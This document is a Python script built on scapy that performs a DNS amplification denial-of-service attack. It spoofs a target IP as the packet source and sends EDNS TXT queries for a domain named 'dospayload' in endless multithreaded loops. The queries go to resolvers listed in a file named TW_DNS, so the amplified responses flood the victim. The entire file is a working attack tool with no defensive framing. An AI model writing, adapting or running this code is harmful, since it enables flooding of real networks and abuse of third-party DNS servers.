import sys
import time
import threading
from scapy.volatile import RandShort
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRROPT

def send_packet(target, dns):
    full_dns = "dospayload.chickenkiller.com"
    packet = (
        IP(src=target, dst=dns) /
        UDP(sport=RandShort(), dport=53) /
        DNS(
            id=0xdead,
            qr=0,  # Query (0) or Response (1)
            opcode=0,  # Standard query
            rd=1,  # Recursion desired
            ad=1,  # Authentic data
            tc=0,  # cannot set in query but we expect the response is not truncated
            qd=DNSQR(qname=full_dns, qtype=16),  # 16 means TXT
            ar=DNSRROPT(
                rclass=4096,  # maximum is 4096
                version=0,
                z=0x0000,
                extrcode=00,  # Higher bits in extended RCODE
                rdata=[b'\x00\x0a\x00\x08\x31\xb4\x09\x09\x4b\xb5\xaf\x56']  # cookie part, copy from dig response resolved by Wireshark
            )
        )
    )
    send(packet, verbose=False, realtime=False)
    # send(packet, loop=1, verbose=False, inter=0.1, realtime=False)

def process_dns_batch(target, dns_batch):
    """
    Process a batch of DNS servers in a single thread
    
    :param target: Source IP address
    :param dns_batch: List of DNS server IPs to process
    """
    thread_name = threading.current_thread().name
    print(f"{thread_name} processing {len(dns_batch)} DNS servers")
    
    while True:
        for dns in dns_batch:
            try:
                print(dns)
                send_packet(target, dns.strip())
            except Exception as e:
                print(f"Error processing DNS {dns}: {e}")

        time.sleep(0.1)

def main(target, batch_size=500):
    # Read DNS servers from file
    with open("./TW_DNS", 'r') as f:
        dns_servers = f.readlines()
    
    # Create threads to process DNS servers in batches
    threads = []
    for i in range(0, len(dns_servers), batch_size):
        # Slice the list to get a batch of DNS servers
        dns_batch = dns_servers[i:i+batch_size]
        
        # Create and start a thread for this batch
        thread = threading.Thread(
            target=process_dns_batch, 
            args=(target, dns_batch),
            name=f"DNSThread-{i//batch_size + 1}"
        )
        thread.start()
        threads.append(thread)
    
    # Optional: Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Check if target IP is provided
    if len(sys.argv) < 2:
        print("Usage: python script.py <target_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    main(target_ip)
